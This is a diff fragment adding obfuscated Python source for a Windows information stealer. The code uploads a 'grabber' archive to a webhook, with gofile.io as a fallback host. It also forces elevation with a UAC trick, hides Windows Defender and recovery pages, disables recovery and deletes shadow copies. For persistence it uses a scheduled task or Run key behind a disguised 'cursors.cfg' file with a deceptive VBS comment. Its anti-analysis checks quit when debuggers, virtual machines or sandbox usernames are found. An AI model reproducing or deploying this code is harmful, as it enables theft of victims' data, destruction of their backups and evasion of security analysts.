+                            E: _B,
+                        },
+                        {
+                            C: "⏱️ **Execution Time**",
+                            D: f"Time: `{'{:.2f}'.format(time.time()-A.starttime)}s`",
+                            E: _B,
+                        },
+                    ],
+                    "footer": {
+                        "text": f"Grabber Stats - {time.strftime('%Y-%m-%d %H:%M:%S')}",
+                        "icon_url": H,
+                    },
+                }
+            ],
+        }
+        R = {_a: V, U: H}
+        with open(F, "rb") as G:
+            requests.post(A.webhook, json=e)
+            if requests.post(A.webhook, data=R, files={X: G}).status_code == 413:
+                G.seek(0)
+                f = requests.get("https://api.gofile.io/getServer").json()[Y]["server"]
+                g = requests.post(
+                    url=f"https://{f}.gofile.io/uploadFile",
+                    data={
+                        "token": _C,
+                        "folderId": _C,
+                        W: _C,
+                        "password": _C,
+                        "tags": _C,
+                        "expire": _C,
+                    },
+                    files={X: G},
+                ).json()[Y]["downloadPage"]
+                S = R.copy()
+                S.update({T: f"{g}"})
+                requests.post(A.webhook, json=S)
+        os.remove(F)
+
+    def forceadmin(A):
+        A.system(
+            f"set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process '{sys.argv[0]}' -WindowStyle Hidden -verb runAs -ArgumentList '--nouacbypass'>nul"
+        )
+        sys.exit()
+
+    def persist(A):
+        I = "Cursors\\cursorinit.vbs"
+        H = "Cursors\\cursors.cfg"
+        G = "Cursors\\"
+        F = "Cursors"
+        E = "C:\\Windows\\Cursors"
+        B = "\\Cursors"
+        try:
+            C = ctypes.windll.shell32.IsUserAnAdmin()
+        except Exception:
+            C = _B
+        if C:
+            try:
+                A.system(
+                    f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:recovery;windowsdefender" /f >nul'
+                )
+                A.system(f"reagentc /disable >nul")
+                A.system(f"vssadmin delete shadows /all /quiet >nul")
+                shutil.copy2(sys.argv[0], "C:\\Windows\\Cursors\\")
+                os.rename(
+                    os.path.join(
+                        E, os.path.basename(sys.argv[0]), "C:\\Windows\\Cursors\\cursors.cfg"
+                    )
+                )
+                with open("cursorinit.vbs", _E) as D:
+                    D.write(
+                        "' This script loads the cursor configuration\n' And cursors themselves\n' Into the shell so that Fondrvhost.exe (The font renderer)\n' Can use them.\n' It is recommended not to tamper with\n' Any files in this directory\n' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c C:\\Windows\\Cursors\\cursors.cfg\", 0, True\n"
+                    )
+                A.system(
+                    f'schtasks /create /tn "CursorSvc" /sc ONLOGON /tr "C:\\Windows\\Cursors\\cursorinit.vbs" /rl HIGHEST /f >nul'
+                )
+                ctypes.windll.kernel32.SetFileAttributesW(E, 2)
+                ctypes.windll.kernel32.SetFileAttributesW(E, 4)
+                ctypes.windll.kernel32.SetFileAttributesW(A.roaming + B, 598)
+            except Exception:
+                A.exceptions.append(traceback.format_exc())
+        elif C == _B and os.getcwd() != os.path.join(A.roaming, F):
+            try:
+                try:
+                    shutil.rmtree(os.path.join(A.roaming, F))
+                except Exception:
+                    pass
+                os.makedirs(A.roaming + B, 493, exist_ok=_D)
+                ctypes.windll.kernel32.SetFileAttributesW(A.roaming + B, 2)
+                ctypes.windll.kernel32.SetFileAttributesW(A.roaming + B, 4)
+                ctypes.windll.kernel32.SetFileAttributesW(A.roaming + B, 598)
+                shutil.copy2(sys.argv[0], os.path.join(A.roaming, G))
+                os.rename(
+                    os.path.join(A.roaming, G, os.path.basename(sys.argv[0])),
+                    os.path.join(A.roaming, H),
+                )
+                J = H
+                K = I
+                with open(os.path.join(A.roaming, I), _E) as D:
+                    D.write(
+                        f"""' This script loads the cursor configuration
+' And cursors themselves
+' Into the shell so that Fondrvhost.exe (The font renderer)
+' Can use them.
+' It is recommended not to tamper with
+' Any files in this directory
+' Doing so may cause the explorer to crash
+Set objShell = WScript.CreateObject(\"WScript.Shell\")
+objShell.Run \"cmd /c '{os.path.join(A.roaming,J)}'\", 0, True
+"""
+                    )
+                A.system(
+                    f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "CursorInit" /t REG_SZ /d "{os.path.join(A.roaming,K)}" /f >nul'
+                )
+            except Exception:
+                A.exceptions.append(traceback.format_exc())
+
+
+def handler():
+    try:
+        ticks(15)
+    except Exception:
+        pass
+    internal.stolen = _D
+    if config.get(_d):
+        while _D:
+            time.sleep(random.randrange(3400, 3800))
+            try:
+                ticks(15)
+            except Exception:
+                pass
+
+
+def stabilizeTicks():
+    C = "idaq.exe"
+    B = "ollydbg.exe"
+    A = "ida64.exe"
+    if config[_h]:
+        if os.path.exists("D:\\Tools") or os.path.exists("D:\\OS2") or os.path.exists("D:\\NT3X"):
+            return
+        if (
+            ctypes.windll.kernel32.IsDebuggerPresent()
+            or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
+                ctypes.windll.kernel32.GetCurrentProcess(), _B
+            )
+        ):
+            return
+        for D in psutil.process_iter():
+            if D.name() in [
+                "ProcessHacker.exe",
+                "httpdebuggerui.exe",
+                "wireshark.exe",
+                "fiddler.exe",
+                "vboxservice.exe",
+                "df5serv.exe",
+                "processhacker.exe",
+                "vboxtray.exe",
+                "vmtoolsd.exe",
+                "vmwaretray.exe",
+                A,
+                B,
+                "pestudio.exe",
+                "vmwareuser.exe",
+                "vgauthservice.exe",
+                "vmacthlp.exe",
+                "vmsrvc.exe",
+                "x32dbg.exe",
+                "x64dbg.exe",
+                "x96dbg.exe",
+                "vmusrvc.exe",
+                "prl_cc.exe",
+                "prl_tools.exe",
+                "qemu-ga.exe",
+                "joeboxcontrol.exe",
+                "ksdumperclient.exe",
+                "xenservice.exe",
+                "joeboxserver.exe",
+                "devenv.exe",
+                "IMMUNITYDEBUGGER.EXE",
+                "ImportREC.exe",
+                "reshacker.exe",
+                "windbg.exe",
+                "32dbg.exe",
+                "64dbg.exex",
+                "protection_id.exex",
+                "scylla_x86.exe",
+                "scylla_x64.exe",
+                "scylla.exe",
+                "idau64.exe",
+                "idau.exe",
+                "idaq64.exe",
+                C,
+                C,
+                "idaw.exe",
+                "idag64.exe",
+                "idag.exe",
+                A,
+                "ida.exe",
+                B,
+            ]:
+                return
+        if os.getlogin() in [
+            "WDAGUtilityAccount",
+            "Abby",
+            "Peter Wilson",
+            "hmarc",
+            "patex",
+            "JOHN-PC",
+            "RDhJ0CNFevzX",
+            "kEecfMwgj",
+            "Frank",
+            "8Nl0ColNQ5bq",
+            "Lisa",
+            "John",
+            "george",
+            "PxmdUOpVyx",
+            "8VizSM",
+            "w0fjuOVmCcP5A",
+            "lmVwjj9b",
+            "PqONjHVwexsS",
+            "3u2v9m8",
+            "Julia",
+            "HEUeRzl",
+            "Joe",
+        ]:
+            return
+        if functions.system(functions, _A2).splitlines()[1] in [
+            "Microsoft Remote Display Adapter",
+            "Microsoft Hyper-V Video",
+            "Microsoft Basic Display Adapter",
+            "VMware SVGA 3D",
+            "Standard VGA Graphics Adapter",
+            "NVIDIA GeForce 840M",
+            "NVIDIA GeForce 9400M",
+            "UKBEHH_S",
+            "ASPEED Graphics Family(WDDM)",
+            "H_EDEUEK",
+            "VirtualBox Graphics Adapter",
+            "K9SC88UK",
+            "Стандартный VGA графический адаптер",
+        ]:
+            return
+        if int(str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]) <= 50:
+            return
+    if config[_g]:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    try:
+        handler()
+    except Exception:
+        pass
+
+
+ticks.starttime = time.time()
